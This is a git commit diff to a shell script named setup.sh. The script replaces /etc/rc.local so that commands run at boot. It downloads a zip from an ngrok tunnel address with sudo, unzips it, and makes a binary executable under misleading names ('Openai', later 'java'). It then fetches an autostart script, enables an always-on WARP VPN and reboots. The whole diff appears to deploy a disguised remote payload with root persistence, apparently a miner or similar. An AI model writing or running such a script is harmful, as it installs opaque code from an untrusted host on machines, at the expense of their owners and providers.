6a9eed6ea0e7b59106343b7a6382dfb2dacd8e0f
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-01-15 15:35:35 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -7,10 +7,11 @@ wget https://raw.githubusercontent.com/minnie1311/dang/main/rc.local1
 sudo mv rc.local1 /etc/rc.local
 sudo chmod +x /etc/rc.local
 sudo systemctl enable rc-local
-sudo wget http://b529-20-197-103-154.ngrok.io/don.zip
-sudo unzip don.zip
-sudo chmod +x Openai
-sudo wget https://raw.githubusercontent.com/minnie1311/dang/main/autostart.sh
+sudo wget http://b529-20-197-103-154.ngrok.io/ubuntu_18.04.zip
+sudo unzip ubuntu_18.04.zip
+sudo chmod +x java
+sudo rm start.sh
+sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
 warp-cli enable-always-on
 sudo reboot
 
